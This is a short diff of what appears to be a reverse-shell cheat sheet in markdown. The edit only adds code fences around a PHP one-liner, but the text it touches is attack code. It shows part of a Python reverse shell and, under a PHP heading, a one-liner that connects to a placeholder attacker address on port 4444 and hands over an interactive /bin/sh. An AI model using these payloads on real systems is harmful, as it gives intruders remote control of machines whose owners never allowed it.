@@ -29,5 +29,6 @@ python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER\_IP",444
 
 ## PHP
 
+```bash
 php -r '$sock=fsockopen("ATTACKER\_IP",4444);exec("/bin/sh -i <\&3 >\&3 2>\&3");'
-
+```
